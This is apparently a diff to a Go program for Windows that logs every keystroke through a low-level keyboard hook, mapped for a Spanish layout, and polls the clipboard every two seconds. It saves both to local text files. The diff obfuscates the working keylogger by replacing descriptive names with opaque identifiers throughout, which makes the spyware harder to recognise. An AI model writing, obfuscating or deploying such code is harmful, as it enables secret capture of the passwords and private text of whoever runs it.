@@ -14,56 +14,49 @@ import (
 )
 
 const (
-	WH_KEYBOARD_LL = 13
-	WH_MOUSE_LL    = 14
-	WM_KEYDOWN     = 0x0100
-	WM_KEYUP       = 0x0101
-	WM_SYSKEYDOWN  = 0x0104
-	WM_SYSKEYUP    = 0x0105
-	WM_LBUTTONDOWN = 0x0201
-	WM_RBUTTONDOWN = 0x0204
-	WM_MBUTTONDOWN = 0x0207
-	HC_ACTION      = 0
-
-	LAYOUT_ES = 0x0C0A
-	LAYOUT_EN = 0x0409
-	LAYOUT_FR = 0x040C
-	LAYOUT_DE = 0x0407
-	LAYOUT_IT = 0x0410
-	LAYOUT_PT = 0x0816
+	_h = 13
+	_g = 14
+	_q = 0x0100
+	_z = 0x0101
+	_j = 0x0104
+	_k = 0x0105
+	_l = 0x0201
+	_n = 0x0204
+	_m = 0x0207
+	_c = 0
+	_w = 0x0C0A
+	_x = 0x0409
 )
 
 var (
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
-	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
-	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
-	procGetMessage          = user32.NewProc("GetMessageW")
-	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
-	kernel32                = syscall.NewLazyDLL("kernel32.dll")
-	openClipboard           = user32.NewProc("OpenClipboard")
-	closeClipboard          = user32.NewProc("CloseClipboard")
-	getClipboardData        = user32.NewProc("GetClipboardData")
-	globalLock              = kernel32.NewProc("GlobalLock")
-	globalUnlock            = kernel32.NewProc("GlobalUnlock")
-	CF_UNICODETEXT          = 13
-	keyboardHookID          syscall.Handle
-	mouseHookID             syscall.Handle
-	isShiftPressed          = false
-	isAltGrPressed          = false
-	isCtrlPressed           = false
-	isAltPressed            = false
-	buffer                  string
-	keyboardLayoutID        int
-	lastClipboard           string
+	_d  = syscall.NewLazyDLL("user32.dll")
+	_f  = syscall.NewLazyDLL("kernel32.dll")
+	_y  = _d.NewProc("SetWindowsHookExW")
+	_a  = _d.NewProc("CallNextHookEx")
+	_e  = _d.NewProc("UnhookWindowsHookEx")
+	_t  = _d.NewProc("GetMessageW")
+	_b  = _d.NewProc("GetAsyncKeyState")
+	_v  = _d.NewProc("OpenClipboard")
+	_u  = _d.NewProc("CloseClipboard")
+	_i  = _d.NewProc("GetClipboardData")
+	_o  = _f.NewProc("GlobalLock")
+	_p  = _f.NewProc("GlobalUnlock")
+	_s  = 13
+	_r  syscall.Handle
+	_i2 = false
+	_y2 = false
+	_x2 = false
+	_k2 = false
+	_a2 string
+	_c2 int
+	_a3 string
 )
 
 func init() {
-	keyboardLayoutID = int(C.GetKeyboardLayoutID())
-
+	_c2 = int(C.GetKeyboardLayoutID())
 }
 
-func baseVkCodeMap() map[uint32]string {
+func g1() map[uint32]string {
 	return map[uint32]string{
 		8: "[Backspace]", 9: "[Tab]", 13: "[Enter]\n", 27: "[Esc]",
 		32: " ", 37: "[LeftArrow]", 38: "[UpArrow]", 39: "[RightArrow]", 40: "[DownArrow]",
@@ -75,24 +68,24 @@ func baseVkCodeMap() map[uint32]string {
 	}
 }
 
-func mergeMaps(base, custom map[uint32]string) map[uint32]string {
-	for k, v := range custom {
-		base[k] = v
+func f1(b1, b2 map[uint32]string) map[uint32]string {
+	for k, v := range b2 {
+		b1[k] = v
 	}
-	return base
+	return b1
 }
 
-func generateVkCodeMap(shift, altGr bool) map[uint32]string {
-	switch keyboardLayoutID {
-	case LAYOUT_ES:
-		return mergeMaps(baseVkCodeMap(), generateSpanishVkCodeMap(shift, altGr))
+func f2(a1, b1 bool) map[uint32]string {
+	switch _c2 {
+	case _w:
+		return f1(g1(), f3(a1, b1))
 	default:
-		return mergeMaps(baseVkCodeMap(), generateSpanishVkCodeMap(shift, altGr))
+		return f1(g1(), f3(a1, b1))
 	}
 }
 
-func generateSpanishVkCodeMap(shift, altGr bool) map[uint32]string {
-	baseMap := map[uint32]string{
+func f3(b1, b2 bool) map[uint32]string {
+	a1 := map[uint32]string{
 		48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
 		65: "a", 66: "b", 67: "c", 68: "d", 69: "e", 70: "f", 71: "g", 72: "h", 73: "i", 74: "j",
 		75: "k", 76: "l", 77: "m", 78: "n", 79: "o", 80: "p", 81: "q", 82: "r", 83: "s", 84: "t",
@@ -100,146 +93,144 @@ func generateSpanishVkCodeMap(shift, altGr bool) map[uint32]string {
 		186: "ñ", 187: "´", 188: ",", 189: "-", 190: ".", 191: "-", 192: "º",
 		219: "`", 220: "\\", 221: "ç", 222: "¨",
 	}
-	if shift {
-
+	if b1 {
 		for i := 65; i <= 90; i++ {
-			baseMap[uint32(i)] = string(rune(i))
+			a1[uint32(i)] = string(rune(i))
 		}
-		baseMap[48] = ")"
-		baseMap[49] = "!"
-		baseMap[50] = "\""
-		baseMap[51] = "#"
-		baseMap[52] = "$"
-		baseMap[53] = "%"
-		baseMap[54] = "&"
-		baseMap[55] = "/"
-		baseMap[56] = "("
-		baseMap[57] = "="
+		a1[48] = ")"
+		a1[49] = "!"
+		a1[50] = "\""
+		a1[51] = "#"
+		a1[52] = "$"
+		a1[53] = "%"
+		a1[54] = "&"
+		a1[55] = "/"
+		a1[56] = "("
+		a1[57] = "="
 	}
-	if altGr {
-		baseMap[49] = "|"
-		baseMap[52] = "~"
-		baseMap[54] = "¬"
-		baseMap[50] = "@"
-		baseMap[51] = "#"
-		baseMap[92] = "\\"
-		if shift {
+	if b2 {
+		a1[49] = "|"
+		a1[52] = "~"
+		a1[54] = "¬"
+		a1[50] = "@"
+		a1[51] = "#"
+		a1[92] = "\\"
+		if b1 {
 			for i := 65; i <= 90; i++ {
-				baseMap[uint32(i)] = string(rune(i - 32))
+				a1[uint32(i)] = string(rune(i - 32))
 			}
 		}
 	}
-	return baseMap
+	return a1
 }
 
-func checkKeyState(vkCode int) bool {
-	state, _, _ := procGetAsyncKeyState.Call(uintptr(vkCode))
-	return state&0x8000 != 0
+func d2(a1 int) bool {
+	s, _, _ := _b.Call(uintptr(a1))
+	return s&0x8000 != 0
 }
 
-func saveToFile(filename, content string) {
-	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err == nil {
-		file.WriteString(content)
-		if content == "\n" {
-			file.WriteString("\n")
+func saveToFile(f, d string) {
+	s, _ := os.OpenFile(f, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if s != nil {
+		s.WriteString(d)
+		if d == "\n" {
+			s.WriteString("\n")
 		}
-		file.Close()
+		s.Close()
 	}
 }
 
-func LowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
-	if nCode == HC_ACTION {
-		kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
-			switch kbdstruct.VkCode {
+func f5(nCode int, wParam uintptr, lParam uintptr) uintptr {
+	if nCode == _c {
+		b := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
+		if wParam == _q || wParam == _j {
+			switch b.VkCode {
 			case 160, 161:
-				isShiftPressed = true
+				_i2 = true
 			case 162:
-				if !isAltGrPressed {
-					isCtrlPressed = true
+				if !_y2 {
+					_x2 = true
 				}
 			case 163:
-				if !isAltGrPressed {
-					isCtrlPressed = true
+				if !_y2 {
+					_x2 = true
 				}
 			case 164:
-				isAltPressed = true
+				_k2 = true
 			case 165:
-				isAltGrPressed = true
-				isCtrlPressed = false
+				_y2 = true
+				_x2 = false
 			}
 
-			vkCodeToChar := generateVkCodeMap(isShiftPressed, isAltGrPressed)
-			char, ok := vkCodeToChar[kbdstruct.VkCode]
+			c := f2(_i2, _y2)
+			d, ok := c[b.VkCode]
 			if ok {
-				if char == "\n" {
-					saveToFile("keystrokes.txt", buffer)
-					buffer = ""
-				} else if char != "[ShiftLeft]" && char != "[ShiftRight]" && char != "[CtrlLeft]" && char != "[CtrlRight]" && char != "[AltLeft]" && char != "[AltGr]" {
-					buffer += char
+				if d == "\n" {
+					saveToFile("keystrokes.txt", _a2)
+					_a2 = ""
+				} else if d != "[ShiftLeft]" && d != "[ShiftRight]" && d != "[CtrlLeft]" && d != "[CtrlRight]" && d != "[AltLeft]" && d != "[AltGr]" {
+					_a2 += d
 				}
 
 			}
-		} else if wParam == WM_KEYUP || wParam == WM_SYSKEYUP {
-			switch kbdstruct.VkCode {
+		} else if wParam == _z || wParam == _k {
+			switch b.VkCode {
 			case 160, 161:
-				isShiftPressed = false
+				_i2 = false
 			case 162:
-				if !isAltGrPressed {
-					isCtrlPressed = false
+				if !_y2 {
+					_x2 = false
 				}
 			case 163:
-				if !isAltGrPressed {
-					isCtrlPressed = false
+				if !_y2 {
+					_x2 = false
 				}
 			case 164:
-				isAltPressed = false
+				_k2 = false
 			case 165:
-				isAltGrPressed = false
+				_y2 = false
 			}
 		}
 	}
 
-	if len(buffer) > 0 {
-		saveToFile("keystrokes.txt", buffer)
-		buffer = ""
+	if len(_a2) > 0 {
+		saveToFile("keystrokes.txt", _a2)
+		_a2 = ""
 	}
 
-	result, _, _ := procCallNextHookEx.Call(uintptr(keyboardHookID), uintptr(nCode), wParam, lParam)
+	result, _, _ := _a.Call(uintptr(_r), uintptr(nCode), wParam, lParam)
 	return result
 }
 
-func readClipboard() (string, error) {
+func r1() (string, error) {
 
-	r, _, err := openClipboard.Call(0)
+	r, _, e := _v.Call(0)
 	if r == 0 {
-		return "", fmt.Errorf("%v", err)
+		return "", fmt.Errorf("%v", e)
 	}
-	defer closeClipboard.Call()
+	defer _u.Call()
 
-	h, _, err := getClipboardData.Call(uintptr(CF_UNICODETEXT))
+	h, _, e := _i.Call(uintptr(_s))
 	if h == 0 {
-		return "", fmt.Errorf("%v", err)
+		return "", fmt.Errorf("%v", e)
 	}
 
-	ptr, _, err := globalLock.Call(h)
+	ptr, _, e := _o.Call(h)
 	if ptr == 0 {
-		return "", fmt.Errorf("Fallo al bloquear memoria global: %v", err)
+		return "", fmt.Errorf("failed to lock: %v", e)
 	}
-	defer globalUnlock.Call(h)
+	defer _p.Call(h)
 
 	text := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(ptr))[:])
 
 	return text, nil
 }
 
-func monitorClipboard() {
+func f6() {
 	for {
-		text, err := readClipboard()
-		if err == nil && text != lastClipboard {
-			lastClipboard = text
-
+		text, e := r1()
+		if e == nil && text != _a3 {
+			_a3 = text
 			saveToFile("clipboard.txt", text)
 		}
 		time.Sleep(2 * time.Second)
@@ -255,12 +246,12 @@ type KBDLLHOOKSTRUCT struct {
 }
 
 func main() {
-	go monitorClipboard()
+	go f6()
 
-	keyboardHookProc := syscall.NewCallback(LowLevelKeyboardProc)
+	keyboardHookProc := syscall.NewCallback(f5)
 
-	hKey, _, err := procSetWindowsHookEx.Call(
-		uintptr(WH_KEYBOARD_LL),
+	hKey, _, err := _y.Call(
+		uintptr(_h),
 		keyboardHookProc,
 		0,
 		0,
@@ -268,9 +259,9 @@ func main() {
 	if hKey == 0 {
 		return
 	}
-	keyboardHookID = syscall.Handle(hKey)
+	_r = syscall.Handle(hKey)
 
-	defer procUnhookWindowsHookEx.Call(uintptr(keyboardHookID))
+	defer _e.Call(uintptr(_r))
 
 	var msg struct {
 		hwnd    uintptr
@@ -281,6 +272,6 @@ func main() {
 		pt      struct{ x, y int32 }
 	}
 	for {
-		procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
+		_t.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
 	}
 }
